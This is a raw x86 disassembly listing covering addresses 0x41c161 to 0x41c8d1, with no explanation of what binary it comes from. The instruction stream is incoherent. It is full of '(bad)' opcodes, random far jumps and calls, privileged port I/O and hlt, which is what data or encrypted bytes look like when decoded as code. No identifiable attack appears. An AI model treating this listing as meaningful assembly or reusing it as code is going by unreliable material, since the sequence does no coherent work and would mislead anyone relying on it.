  41c161:	mov    WORD PTR [eax+eax*4],fs
  41c164:	inc    BYTE PTR [edx+0x9]
  41c167:	cdq    
  41c168:	and    al,bh
  41c16a:	out    0x40,eax
  41c16c:	mov    al,ds:0xc3eecb94
  41c171:	pop    esi
  41c172:	jae    0x41c194
  41c174:	dec    edx
  41c175:	neg    BYTE PTR [eax]
  41c177:	pop    es
  41c178:	es push bp
  41c17b:	not    DWORD PTR [edx]
  41c17d:	xor    al,0xb5
  41c17f:	neg    BYTE PTR [ebp-0x67]
  41c182:	rol    esi,1
  41c184:	cs pop edx
  41c186:	inc    ecx
  41c187:	pop    ebp
  41c188:	pop    edx
  41c189:	dec    ebp
  41c18a:	dec    eax
  41c18b:	das    
  41c18c:	adc    BYTE PTR [ebx+0x1e],0xf0
  41c190:	jmp    0xfa4a:0x3970ab3b
  41c197:	js     0x41c192
  41c199:	cmp    eax,0x17318d11
  41c19e:	dec    ebx
  41c19f:	push   ecx
  41c1a0:	jae    0x41c218
  41c1a2:	mov    edi,0x363ee7ad
  41c1a7:	(bad)  
  41c1a8:	shl    BYTE PTR [edi],1
  41c1aa:	ret    0xbb5
  41c1ad:	in     eax,0x8b
  41c1af:	or     DWORD PTR [ebp-0x32d8a4ac],esp
  41c1b5:	paddsb mm0,QWORD PTR [esi+0x6a3e572]
  41c1bc:	mov    bl,al
  41c1be:	or     DWORD PTR [ecx-0x5c2ca21a],0xdc0c405b
  41c1c8:	imul   edi,ebx,0xffffffd1
  41c1cb:	das    
  41c1cc:	mov    ecx,0xcb136545
  41c1d1:	out    dx,eax
  41c1d2:	adc    al,0x50
  41c1d4:	cwde   
  41c1d5:	adc    DWORD PTR [eax+0x61ef744b],0x55
  41c1dc:	popa   
  41c1dd:	mov    dh,0xef
  41c1df:	stos   DWORD PTR es:[edi],eax
  41c1e0:	pop    ebp
  41c1e1:	push   ds
  41c1e2:	push   esi
  41c1e3:	jge    0x41c24c
  41c1e5:	mov    ds:0x9bec18ba,eax
  41c1ea:	xor    bl,BYTE PTR [edx+0x39fea2de]
  41c1f0:	data16 fpatan 
  41c1f3:	fnsave [ebx+0xa]
  41c1f6:	(bad)  
  41c1f7:	fiadd  WORD PTR [edi+0x17427230]
  41c1fd:	mov    eax,ds:0x5fd507ee
  41c202:	xor    dh,BYTE PTR [edi+0x14a5117c]
  41c208:	(bad)  
  41c20a:	and    BYTE PTR [ebp-0x4a],bh
  41c20d:	sbb    dl,BYTE PTR [edi]
  41c20f:	sbb    bl,BYTE PTR [edi-0x692bde69]
  41c215:	xor    eax,0x2ba8c24d
  41c21a:	loope  0x41c22d
  41c21c:	push   ecx
  41c21d:	dec    edi
  41c21e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c21f:	ja     0x41c29e
  41c221:	push   edi
  41c222:	jne    0x41c1d6
  41c224:	inc    edx
  41c225:	retf   0xe020
  41c228:	xchg   ebx,eax
  41c229:	sbb    al,0xd6
  41c22b:	(bad)  
  41c22c:	jle    0x41c21d
  41c22e:	adc    bl,bh
  41c230:	or     edx,ebp
  41c232:	int    0xf5
  41c234:	pop    edx
  41c235:	sbb    BYTE PTR [esi+0x21],ch
  41c238:	jl     0x41c22c
  41c23a:	and    ecx,eax
  41c23c:	inc    edx
  41c23d:	jb     0x41c1da
  41c23f:	ds dec ebx
  41c241:	inc    edx
  41c242:	sbb    eax,0xaf5c7d00
  41c247:	les    eax,FWORD PTR [edx+esi*2-0x238ac0e4]
  41c24e:	jmp    0x4ede0e74
  41c253:	cli    
  41c254:	into   
  41c255:	push   eax
  41c256:	out    dx,eax
  41c257:	bound  edx,QWORD PTR [ebp+eax*1+0x7cde9858]
  41c25e:	addr16 push esp
  41c260:	jecxz  0x41c255
  41c262:	ret    0xf14d
  41c265:	int    0xa2
  41c267:	and    al,0xc1
  41c269:	jp     0x41c2a8
  41c26b:	pop    ds
  41c26c:	sub    BYTE PTR [edi],0x5b
  41c26f:	addr16 cmp al,0xe6
  41c272:	pop    edi
  41c273:	mov    eax,0x2badaaf7
  41c278:	jecxz  0x41c2bd
  41c27a:	push   eax
  41c27b:	add    al,0x11
  41c27d:	scas   eax,DWORD PTR es:[edi]
  41c27e:	and    dh,dh
  41c280:	pop    es
  41c281:	pushf  
  41c282:	inc    ebx
  41c283:	ja     0x41c22f
  41c285:	pop    esp
  41c286:	inc    BYTE PTR [ebp-0x58]
  41c289:	shl    esi,cl
  41c28b:	js     0x41c22b
  41c28d:	mov    ebp,0x8b4c0085
  41c292:	xchg   dh,bl
  41c294:	outs   dx,BYTE PTR ds:[esi]
  41c295:	out    dx,al
  41c296:	test   BYTE PTR [edi],ah
  41c298:	or     DWORD PTR [esi],0xc377a199
  41c29e:	xchg   edi,eax
  41c29f:	pop    eax
  41c2a0:	mov    eax,ds:0x302dc4b1
  41c2a5:	mov    edi,0xb1651eba
  41c2aa:	xchg   eax,ecx
  41c2ac:	arpl   WORD PTR [ebp+0x47],si
  41c2af:	outs   dx,BYTE PTR ds:[esi]
  41c2b1:	test   eax,0xbb5543fd
  41c2b6:	jle    0x41c2ae
  41c2b8:	daa    
  41c2b9:	ins    DWORD PTR es:[edi],dx
  41c2ba:	adc    eax,0x1de2f43e
  41c2bf:	jg     0x41c27f
  41c2c1:	test   DWORD PTR [edx+ebx*8-0x62],esp
  41c2c5:	dec    ebx
  41c2c6:	addr16 push ecx
  41c2c8:	push   0x486f4121
  41c2cd:	fstp   TBYTE PTR ds:0xdabb00b6
  41c2d3:	add    BYTE PTR [ebx],ah
  41c2d5:	adc    ch,BYTE PTR [ebx+0x3e]
  41c2d8:	pop    ecx
  41c2d9:	pop    ss
  41c2da:	dec    ebp
  41c2db:	cwde   
  41c2dc:	cmp    esi,0x49a81240
  41c2e2:	fidiv  DWORD PTR [ecx-0x5b82b4e4]
  41c2e8:	inc    ebx
  41c2e9:	lods   al,BYTE PTR ds:[esi]
  41c2ea:	xor    BYTE PTR [edi],0x20
  41c2ed:	and    ch,dh
  41c2ef:	neg    esi
  41c2f1:	movnti DWORD PTR [ebx+esi*4-0x7a32f033],eax
  41c2f9:	push   0xa4d6571
  41c2fe:	jae    0x41c33c
  41c300:	or     DWORD PTR [edx+eiz*4+0x23dcdea5],esp
  41c307:	and    eax,0x51c2c0cc
  41c30c:	sub    BYTE PTR [edx-0x25e8aaf5],0xb
  41c313:	(bad)  
  41c314:	adc    al,0x86
  41c316:	jb     0x41c298
  41c318:	icebp  
  41c319:	fmulp  st(4),st
  41c31b:	scas   eax,DWORD PTR es:[edi]
  41c31c:	ficom  WORD PTR ds:0xd6bfb12
  41c322:	inc    edi
  41c323:	mov    BYTE PTR [esi],bh
  41c325:	test   esp,esi
  41c327:	stos   DWORD PTR es:[edi],eax
  41c328:	add    ch,BYTE PTR [edx+ebx*2]
  41c32b:	add    edi,DWORD PTR [ebp-0x128c69]
  41c331:	fld    QWORD PTR [eax+0x2c1f6f3f]
  41c337:	icebp  
  41c338:	lods   eax,DWORD PTR ds:[esi]
  41c339:	xlat   BYTE PTR ds:[ebx]
  41c33a:	ja     0x41c379
  41c33c:	inc    eax
  41c33d:	ret    0xcf2
  41c340:	dec    ebp
  41c341:	cmp    DWORD PTR [ebp+0x78],edx
  41c344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c345:	mov    al,ds:0xcc344619
  41c34a:	std    
  41c34b:	or     DWORD PTR [ebp-0x74],ebp
  41c34e:	inc    esp
  41c34f:	pop    edx
  41c350:	test   al,0x44
  41c352:	std    
  41c353:	cmc    
  41c354:	sbb    DWORD PTR [edx+0x2c7e1242],edi
  41c35a:	fisub  WORD PTR [esi+ebx*1]
  41c35d:	mov    dh,0xf8
  41c35f:	inc    eax
  41c360:	dec    eax
  41c361:	mov    gs,WORD PTR [ecx+0x6f1d1b6f]
  41c367:	cmp    BYTE PTR [ecx-0x20],dl
  41c36a:	xor    eax,0xa8a46133
  41c36f:	or     ecx,DWORD PTR [edx]
  41c371:	mov    ch,BYTE PTR [ebp+0x54cec9bc]
  41c377:	sar    DWORD PTR [edx+0x30146867],0x3f
  41c37e:	mov    fs,WORD PTR [ecx+0x1f]
  41c381:	loop   0x41c30c
  41c383:	dec    edx
  41c384:	mov    esi,0xec46f572
  41c389:	ret    0x2bcf
  41c38c:	xor    BYTE PTR ds:0xa584242f,0xf8
  41c393:	ins    BYTE PTR es:[edi],dx
  41c394:	inc    eax
  41c395:	add    DWORD PTR [edi+0x5f],esp
  41c398:	aad    0x1c
  41c39a:	ja     0x41c356
  41c39c:	jns    0x41c3e2
  41c39e:	mov    dl,0xdd
  41c3a0:	mov    ebx,0xdcd34742
  41c3a5:	xchg   ecx,eax
  41c3a6:	or     esi,0x1e74ce44
  41c3ac:	adc    DWORD PTR [ebx+0x2aa37f4c],esp
  41c3b2:	nop
  41c3b3:	cmp    eax,DWORD PTR [ecx+0x18db8ad]
  41c3b9:	xchg   esp,eax
  41c3ba:	loopne 0x41c422
  41c3bc:	xor    DWORD PTR [eax+0x44400c4d],ebp
  41c3c2:	pop    ds
  41c3c3:	popa   
  41c3c4:	rcr    bl,0xfe
  41c3c7:	mov    ebp,0x4cc09adc
  41c3cc:	dec    esi
  41c3cd:	or     dh,BYTE PTR [edx+0x4b]
  41c3d0:	les    ebx,FWORD PTR [ebp+ebp*4-0x2d]
  41c3d4:	stc    
  41c3d5:	mov    dh,0x25
  41c3d7:	and    ebx,DWORD PTR [ebp+0x4e]
  41c3da:	lods   al,BYTE PTR ds:[esi]
  41c3db:	cli    
  41c3dc:	stos   BYTE PTR es:[edi],al
  41c3dd:	data16 cmp al,0xb
  41c3e0:	pushf  
  41c3e1:	into   
  41c3e2:	mov    BYTE PTR [ebx],dl
  41c3e4:	inc    esi
  41c3e5:	imul   ecx,DWORD PTR [ebp+eax*8-0x30],0x33
  41c3ea:	sahf   
  41c3eb:	mov    ebx,0x40e379fe
  41c3f0:	call   0x52bcfdb8
  41c3f5:	sti    
  41c3f6:	mov    edx,0xfedeed5d
  41c3fb:	addr16 cld 
  41c3fd:	scas   eax,DWORD PTR es:[edi]
  41c3fe:	or     bl,BYTE PTR [esi-0x62]
  41c401:	push   ecx
  41c402:	jecxz  0x41c3eb
  41c404:	out    0x56,eax
  41c406:	jb     0x41c3ec
  41c408:	scas   al,BYTE PTR es:[edi]
  41c409:	mov    ecx,0xd0ab2ce9
  41c40e:	pop    ds
  41c40f:	sub    ebp,DWORD PTR [ebp+0x37]
  41c412:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c413:	test   eax,0x5f89bd79
  41c418:	push   0xe346b8fe
  41c41d:	dec    edi
  41c41e:	int    0xd4
  41c420:	fcmove st,st(1)
  41c422:	(bad)  [eax]
  41c424:	mov    bl,0xa0
  41c426:	imul   edi,DWORD PTR [esi+0x40],0x3fbd96c5
  41c42d:	mov    cl,ch
  41c42f:	xor    DWORD PTR [edx-0x73],eax
  41c432:	iret   
  41c433:	scas   al,BYTE PTR es:[edi]
  41c434:	adc    ebx,eax
  41c436:	(bad)  
  41c437:	nop
  41c438:	inc    esp
  41c439:	cmc    
  41c43a:	std    
  41c43b:	aas    
  41c43c:	loop   0x41c4bd
  41c43e:	mov    al,ds:0x81b0b369
  41c443:	sbb    BYTE PTR [ebx+0x6a8c2fc],ch
  41c449:	sti    
  41c44a:	dec    edx
  41c44b:	stos   BYTE PTR es:[edi],al
  41c44c:	mov    eax,ds:0x50b7a1f0
  41c451:	sbb    ecx,DWORD PTR [ebx+0x7215a2ae]
  41c457:	int    0xd4
  41c459:	pop    edi
  41c45a:	test   al,0x8a
  41c45c:	cld    
  41c45d:	xor    BYTE PTR [edx-0x1a],0x1e
  41c461:	js     0x41c419
  41c463:	inc    edx
  41c464:	mov    esp,0x68761626
  41c469:	(bad)  
  41c46a:	sbb    BYTE PTR [edx-0x1d],ch
  41c46d:	lds    edi,FWORD PTR [edx]
  41c46f:	inc    edi
  41c470:	xchg   edi,eax
  41c471:	jae    0x41c462
  41c473:	mov    ah,0x72
  41c475:	mov    esp,0x841292df
  41c47a:	cmp    eax,DWORD PTR [esi]
  41c47c:	int    0xa4
  41c47e:	push   ebx
  41c47f:	xchg   edx,eax
  41c480:	adc    al,0x6e
  41c482:	aad    0x6b
  41c484:	je     0x41c4b0
  41c486:	add    BYTE PTR [edi+0x162c0a17],dl
  41c48c:	retf   
  41c48d:	popf   
  41c48e:	fsubr  QWORD PTR ds:0xa9b81fc3
  41c494:	jmp    0xf652:0xc8d318a6
  41c49b:	inc    BYTE PTR [ebx-0x373a3f09]
  41c4a1:	jns    0x41c4be
  41c4a3:	mov    esi,0x8412e9e8
  41c4a8:	mov    ebx,0x8c757c25
  41c4ad:	aam    0xb1
  41c4af:	and    dh,0x87
  41c4b2:	xor    dh,ah
  41c4b4:	inc    esi
  41c4b5:	mov    dl,0x35
  41c4b7:	rol    DWORD PTR [ebp+eiz*8-0x58],cl
  41c4bb:	jle    0x41c526
  41c4bd:	mov    cl,0x4c
  41c4bf:	or     eax,0xac2f0280
  41c4c4:	mov    ecx,0xfb5b8845
  41c4c9:	sbb    ah,ch
  41c4cb:	or     BYTE PTR [ecx-0x71a709db],dh
  41c4d1:	inc    esi
  41c4d2:	loope  0x41c4f0
  41c4d4:	inc    ecx
  41c4d5:	mov    edx,0x8c1d372d
  41c4da:	mov    ebx,DWORD PTR [edx]
  41c4dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4dd:	cmp    eax,0xa829c00
  41c4e2:	xchg   esp,eax
  41c4e3:	(bad)  
  41c4e4:	fadd   DWORD PTR [ecx+0x3cfdf8b7]
  41c4ea:	inc    ebx
  41c4eb:	and    DWORD PTR [edx],0x7f
  41c4ee:	mov    ecx,0xd90f2c8c
  41c4f3:	push   ecx
  41c4f4:	jg     0x41c48c
  41c4f6:	mov    al,0x15
  41c4f8:	sub    edx,ebp
  41c4fa:	jle    0x41c554
  41c4fc:	call   0x42f5:0xd77bc22f
  41c503:	inc    eax
  41c504:	repnz cwde 
  41c506:	push   es
  41c507:	lea    edx,ds:0x28013226
  41c50d:	push   ss
  41c50e:	daa    
  41c50f:	push   eax
  41c510:	sar    DWORD PTR [ebp*2-0x3a5e0a21],0x4f
  41c518:	popf   
  41c519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c51a:	int    0xd3
  41c51c:	xchg   edi,eax
  41c51d:	jbe    0x41c588
  41c51f:	jb     0x41c580
  41c521:	dec    ebp
  41c522:	rcr    DWORD PTR [esi+0x50],1
  41c525:	xor    al,0x64
  41c527:	pusha  
  41c528:	pop    esp
  41c529:	mov    al,ds:0x4dc8a83a
  41c52e:	repz cdq 
  41c530:	dec    ebp
  41c531:	test   DWORD PTR [edx+0x9],ecx
  41c534:	(bad)  
  41c535:	xchg   esi,eax
  41c536:	pusha  
  41c537:	xchg   esi,eax
  41c538:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c539:	cs push edi
  41c53b:	rcr    DWORD PTR [eax],cl
  41c53d:	jg     0x41c563
  41c53f:	sbb    DWORD PTR [ebp+0x361d43ea],ebx
  41c545:	and    BYTE PTR [ebx+0x67eebd33],al
  41c54b:	neg    dl
  41c54d:	sub    DWORD PTR [edi],0xfffffff2
  41c550:	jge    0x41c558
  41c552:	jb     0x41c512
  41c554:	or     eax,0xc1e5dcdf
  41c559:	lea    edi,[eax-0x418d788e]
  41c55f:	mov    ebx,0x654a2dc8
  41c564:	cmp    al,0x1f
  41c566:	stos   DWORD PTR es:[edi],eax
  41c567:	adc    BYTE PTR [ecx],al
  41c569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c56a:	pop    ds
  41c56b:	push   edi
  41c56c:	inc    edx
  41c56d:	in     al,dx
  41c56e:	(bad)  
  41c56f:	jmp    0x41c50e
  41c571:	cwde   
  41c572:	mov    al,0xc9
  41c574:	aam    0x47
  41c576:	and    eax,0xbd49f773
  41c57b:	xchg   edx,eax
  41c57c:	mov    ah,0x61
  41c57e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c57f:	add    BYTE PTR [eax-0x4da0338d],0xa8
  41c586:	pop    edi
  41c587:	jnp    0x41c5c0
  41c589:	retf   
  41c58a:	inc    ebx
  41c58b:	lea    esp,[edi+edi*2+0x7f]
  41c58f:	rcr    DWORD PTR ds:[esi],1
  41c592:	xchg   ebp,eax
  41c593:	add    al,0xa4
  41c595:	fcomp  QWORD PTR [esi+esi*4]
  41c598:	jbe    0x41c599
  41c59a:	sbb    eax,0x9a352ebc
  41c59f:	and    bh,BYTE PTR [edx+0x8]
  41c5a2:	inc    ecx
  41c5a3:	std    
  41c5a4:	cs jl  0x41c5fc
  41c5a7:	push   ebx
  41c5a8:	sbb    eax,0xbd732358
  41c5ad:	pop    es
  41c5ae:	and    eax,ecx
  41c5b0:	xchg   ebp,eax
  41c5b1:	mov    esi,0xb6ea3eb5
  41c5b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5b7:	ss add BYTE PTR es:[bp+0x21],bl
  41c5bd:	test   al,0xa2
  41c5bf:	mov    bh,0xe1
  41c5c1:	jmp    0xb7ff57b3
  41c5c6:	mov    ebx,DWORD PTR [eax+edx*2+0x7594f327]
  41c5cd:	leave  
  41c5ce:	xchg   edx,eax
  41c5cf:	shr    DWORD PTR ds:0x9eeeba07,cl
  41c5d5:	aas    
  41c5d6:	(bad)  
  41c5d7:	out    dx,al
  41c5d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5d9:	mov    ah,0xee
  41c5db:	pop    ecx
  41c5dc:	test   BYTE PTR [ebx],0xd7
  41c5df:	dec    ebp
  41c5e0:	mov    bh,0x24
  41c5e2:	rcr    BYTE PTR [esi],cl
  41c5e4:	or     al,0x77
  41c5e6:	call   0xc4061904
  41c5eb:	adc    BYTE PTR [edi],dl
  41c5ed:	add    bh,BYTE PTR [ecx-0x78]
  41c5f0:	jp     0x41c609
  41c5f2:	fcmovne st,st(5)
  41c5f4:	adc    al,0xab
  41c5f6:	push   ss
  41c5f7:	sti    
  41c5f8:	int    0xd4
  41c5fa:	xlat   BYTE PTR ds:[ebx]
  41c5fb:	ins    DWORD PTR es:[edi],dx
  41c5fc:	xchg   BYTE PTR [edx],ah
  41c5fe:	mov    al,ds:0xe1ee94fd
  41c603:	and    BYTE PTR ds:0xd0bcf8ce,0xb0
  41c60a:	pop    esp
  41c60b:	sub    BYTE PTR [edx-0x2c],bh
  41c60e:	stos   BYTE PTR es:[edi],al
  41c60f:	rcr    ah,0x3b
  41c612:	mov    ah,0x60
  41c614:	jmp    0x5396546b
  41c619:	in     al,0xfd
  41c61b:	mov    esp,DWORD PTR [ebx+eiz*4-0x3038edfb]
  41c622:	adc    al,bh
  41c624:	cmp    cl,ah
  41c626:	sbb    edi,ecx
  41c628:	mul    BYTE PTR [edi]
  41c62a:	fiadd  DWORD PTR [ecx+eax*4+0x6f5a839c]
  41c631:	int    0x30
  41c633:	dec    edx
  41c634:	imul   eax,esi,0xf2d71a57
  41c63a:	adc    BYTE PTR [edx],al
  41c63c:	add    edx,edi
  41c63e:	fmul   QWORD PTR [esi+0xb]
  41c641:	(bad)
  41c644:	or     ah,BYTE PTR [esi+0x9cc4624]
  41c64a:	add    bl,BYTE PTR [esi]
  41c64c:	or     DWORD PTR [edx-0x58],eax
  41c64f:	mov    esi,0x8caf86be
  41c654:	cmp    BYTE PTR [eax+0x72],cl
  41c657:	hlt    
  41c658:	pop    edi
  41c659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c65a:	dec    edx
  41c65b:	or     eax,0x2d156f2f
  41c660:	sub    al,BYTE PTR [ecx]
  41c662:	lds    esp,FWORD PTR [eax+0x28bec0b6]
  41c668:	stos   BYTE PTR es:[edi],al
  41c669:	add    dl,BYTE PTR [ecx+0x7]
  41c66c:	fucomi st,st(6)
  41c66e:	int    0x5
  41c670:	rcr    al,cl
  41c672:	stc    
  41c673:	inc    eax
  41c674:	dec    ecx
  41c675:	cmp    bh,BYTE PTR [eax+0x59855e1a]
  41c67b:	out    0x3a,al
  41c67d:	adc    eax,0x79e3dd0e
  41c682:	lds    edi,FWORD PTR ds:0x90d61802
  41c688:	stos   BYTE PTR es:[edi],al
  41c689:	sti    
  41c68a:	cdq    
  41c68b:	call   0x9ed8:0x93e3384b
  41c692:	mov    ds:0xc2bbdd37,eax
  41c697:	sub    al,0x26
  41c699:	stos   DWORD PTR es:[edi],eax
  41c69a:	adc    DWORD PTR [esi+eiz*2-0x72bc3302],ebp
  41c6a1:	cs mov bl,0xef
  41c6a4:	or     ebx,DWORD PTR [ecx-0x4e]
  41c6a7:	mov    ah,0xfe
  41c6a9:	fisubr WORD PTR [edi-0x3dd23ece]
  41c6af:	pop    esi
  41c6b0:	add    al,BYTE PTR [ebp+0x66e9c6fa]
  41c6b6:	mov    edi,0xea0cc20c
  41c6bb:	call   0x2879fd1e
  41c6c0:	aas    
  41c6c1:	pop    ecx
  41c6c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6c3:	mov    esp,0x447010c8
  41c6c8:	daa    
  41c6c9:	xchg   esp,eax
  41c6ca:	dec    ecx
  41c6cb:	xchg   BYTE PTR [esi],bh
  41c6cd:	dec    ecx
  41c6ce:	push   ss
  41c6cf:	add    BYTE PTR [esi],dh
  41c6d1:	mov    esp,0xd485355a
  41c6d6:	cmp    edi,DWORD PTR [eax+0x4541458f]
  41c6dc:	inc    eax
  41c6dd:	pop    es
  41c6de:	xchg   ebx,eax
  41c6df:	into   
  41c6e0:	or     edi,DWORD PTR [ebx]
  41c6e2:	pop    edx
  41c6e3:	sub    eax,0x3278f
  41c6e8:	pop    edi
  41c6e9:	outs   dx,BYTE PTR ds:[esi]
  41c6ea:	and    dl,ah
  41c6ec:	test   DWORD PTR fs:[edi],0x4e2a544b
  41c6f3:	inc    edx
  41c6f4:	js     0x41c737
  41c6f6:	dec    ecx
  41c6f7:	mov    ch,0x6a
  41c6f9:	jne    0x41c743
  41c6fb:	sbb    DWORD PTR [eax+0x2ed1e94b],edi
  41c701:	push   edx
  41c702:	pop    esp
  41c703:	aaa    
  41c704:	inc    esi
  41c705:	mov    cl,0x75
  41c707:	mov    WORD PTR [ebx+0x13],es
  41c70a:	pop    eax
  41c70b:	(bad)  
  41c70c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c70d:	loop   0x41c732
  41c70f:	cmp    esi,edi
  41c711:	mov    ah,0x22
  41c713:	dec    esi
  41c714:	xor    al,0xa6
  41c716:	ret    0x53b5
  41c719:	ja     0x41c78a
  41c71b:	mov    eax,0x435b2953
  41c720:	add    DWORD PTR [edi],edx
  41c722:	or     esi,ebx
  41c724:	add    al,0xb5
  41c726:	pusha  
  41c727:	dec    esp
  41c728:	mov    ds:0xb867b1aa,eax
  41c72d:	jmp    0xbb23:0x5ebff0fe
  41c734:	xchg   edi,eax
  41c735:	loope  0x41c737
  41c737:	lea    edx,[ebx-0x74ccc330]
  41c73d:	out    dx,al
  41c73e:	outs   dx,BYTE PTR ds:[esi]
  41c73f:	xchg   ebp,eax
  41c740:	inc    ebp
  41c741:	shr    BYTE PTR [ecx],1
  41c743:	mov    esi,0x385bc4b7
  41c748:	daa    
  41c749:	(bad)  
  41c74a:	mov    ebx,0x92728067
  41c74f:	das    
  41c750:	retf   0x80b8
  41c753:	outs   dx,BYTE PTR ds:[esi]
  41c754:	cld    
  41c755:	cwde   
  41c756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c757:	hlt    
  41c758:	mov    DWORD PTR [esi],edi
  41c75a:	jo     0x41c770
  41c75c:	add    DWORD PTR [edx],esi
  41c75e:	push   eax
  41c75f:	jp     0x41c791
  41c761:	adc    ebx,ecx
  41c763:	rol    DWORD PTR [ecx],cl
  41c765:	stos   DWORD PTR es:[edi],eax
  41c766:	mov    ebx,0xbefb4d1a
  41c76b:	js     0x41c79b
  41c76d:	dec    ebp
  41c76e:	nop
  41c76f:	cs sbb eax,0x14701bca
  41c775:	in     eax,0x26
  41c777:	pop    DWORD PTR [edi-0x28d0cdb0]
  41c77d:	adc    BYTE PTR [ecx-0x717fc01b],al
  41c783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c784:	jnp    0x41c73f
  41c786:	mov    al,0xc3
  41c788:	xlat   BYTE PTR ds:[ebx]
  41c789:	mov    ds:0x3bd138a7,eax
  41c78e:	dec    ebx
  41c78f:	xchg   ebp,eax
  41c790:	lods   al,BYTE PTR ds:[esi]
  41c791:	mov    dl,0x2a
  41c793:	dec    edi
  41c794:	pop    ds
  41c795:	lods   eax,DWORD PTR ds:[esi]
  41c796:	stos   BYTE PTR es:[edi],al
  41c797:	pusha  
  41c798:	or     DWORD PTR [ebp-0x6ce592bf],0x35078fb9
  41c7a2:	or     edx,DWORD PTR [ecx-0x46]
  41c7a5:	imul   ecx,edi,0x54
  41c7a8:	push   ds
  41c7a9:	fadd   DWORD PTR [ebx-0x1acc3f1]
  41c7af:	sub    eax,0x331ce30e
  41c7b4:	jns    0x41c7fd
  41c7b6:	xor    BYTE PTR fs:[edx+0x21],cl
  41c7ba:	jp     0x41c7a2
  41c7bc:	or     al,0xe2
  41c7be:	xchg   edx,eax
  41c7bf:	cmp    BYTE PTR [edx],cl
  41c7c1:	sub    ebp,eax
  41c7c3:	xchg   dh,ch
  41c7c5:	add    ecx,ebx
  41c7c7:	mov    edi,0x7027bfad
  41c7cc:	adc    ecx,DWORD PTR [edi]
  41c7ce:	ins    DWORD PTR es:[edi],dx
  41c7cf:	jg     0x41c774
  41c7d1:	shl    DWORD PTR [ebp+eax*1-0x45],cl
  41c7d5:	fisttp DWORD PTR [ecx]
  41c7d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7d8:	lods   al,BYTE PTR ds:[esi]
  41c7d9:	xor    eax,0x83f2aaf9
  41c7de:	mov    DWORD PTR [ecx+eax*2-0x4a73588c],ebx
  41c7e5:	mov    ebx,0x66d1ee8
  41c7ea:	adc    esp,0xffffffdd
  41c7ed:	inc    esi
  41c7ee:	test   BYTE PTR [ebx+0x6c],dl
  41c7f1:	sub    ah,BYTE PTR [esi-0x1c]
  41c7f4:	jecxz  0x41c7ee
  41c7f6:	inc    ebx
  41c7f7:	imul   ecx,DWORD PTR [esi+0x687060be],0x16203239
  41c801:	retf   0xc278
  41c804:	out    0xa6,al
  41c806:	push   esp
  41c807:	pop    ebp
  41c808:	imul   edx,ecx,0xd063dd98
  41c80e:	xchg   BYTE PTR [ebp+0x4b21724d],dl
  41c814:	outs   dx,DWORD PTR ds:[esi]
  41c815:	retf   
  41c816:	icebp  
  41c817:	xchg   esi,eax
  41c818:	call   0x2637:0x55c26908
  41c81f:	dec    esp
  41c820:	add    eax,0x42bf613a
  41c825:	leave  
  41c826:	xchg   esp,eax
  41c827:	xor    BYTE PTR [edi+0x5f9b7118],dh
  41c82d:	mov    cl,0x89
  41c82f:	pop    ds
  41c830:	lods   eax,DWORD PTR ds:[esi]
  41c831:	scas   eax,DWORD PTR es:[edi]
  41c832:	icebp  
  41c833:	(bad)
  41c836:	or     ebx,DWORD PTR [edx]
  41c838:	inc    eax
  41c839:	leave  
  41c83a:	sub    al,0xe0
  41c83c:	add    eax,0x34b67b75
  41c841:	mov    ebp,0x112543a8
  41c846:	fwait
  41c847:	or     ch,BYTE PTR [ebx-0x41]
  41c84a:	fisttp WORD PTR [ecx+0x5d]
  41c84d:	jmp    FWORD PTR [ebx+0x5e1a313a]
  41c853:	xchg   BYTE PTR [ecx],ch
  41c855:	hlt    
  41c856:	pop    ebx
  41c857:	pop    ss
  41c858:	xchg   ebx,eax
  41c859:	fisubr WORD PTR [ecx]
  41c85b:	push   es
  41c85c:	mov    al,ds:0x8e4b8637
  41c861:	xor    al,0x30
  41c863:	add    bh,BYTE PTR [edx]
  41c865:	or     al,0xfb
  41c867:	aas    
  41c868:	push   ecx
  41c869:	(bad)  
  41c86a:	je     0x41c8a0
  41c86c:	outs   dx,BYTE PTR ds:[esi]
  41c86d:	jb     0x41c879
  41c86f:	repz shr BYTE PTR [ecx-0x1f],cl
  41c873:	out    0xa5,eax
  41c875:	mov    esi,0x158b46cf
  41c87a:	adc    ecx,DWORD PTR [eax-0xc]
  41c87d:	neg    BYTE PTR [ecx+0x78]
  41c880:	mov    eax,ds:0x5fcc2526
  41c885:	add    DWORD PTR [edx-0x56],esp
  41c888:	data16 and BYTE PTR [eax+0x49fc6a07],dl
  41c88f:	jns    0x41c83a
  41c891:	and    esp,edx
  41c893:	adc    bl,BYTE PTR [ebp-0x19f3d1cf]
  41c899:	nop
  41c89a:	xchg   esi,eax
  41c89b:	inc    ebx
  41c89c:	cmp    DWORD PTR [ebp-0x38],eax
  41c89f:	cli    
  41c8a0:	mov    al,ds:0x1a00937a
  41c8a5:	sub    eax,0xf981612d
  41c8aa:	add    BYTE PTR [ebx],dl
  41c8ac:	mov    ecx,0xc2e43be0
  41c8b1:	dec    edi
  41c8b2:	sub    BYTE PTR [eax],0x53
  41c8b5:	imul   ecx,DWORD PTR [ebx],0x45
  41c8b8:	adc    dl,BYTE PTR [ebp+0x5f68f2ff]
  41c8be:	mov    esi,0xdd4a6cc8
  41c8c3:	das    
  41c8c4:	(bad)  
  41c8c5:	and    dh,bl
  41c8c7:	add    BYTE PTR [bx+si-0x5b],ch
  41c8cb:	fld    TBYTE PTR [eax]
  41c8cd:	pop    ebp
  41c8ce:	loop   0x41c8a0
  41c8d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8d1:	adc    ecx,DWORD PTR ds:0xcaa3d4fe
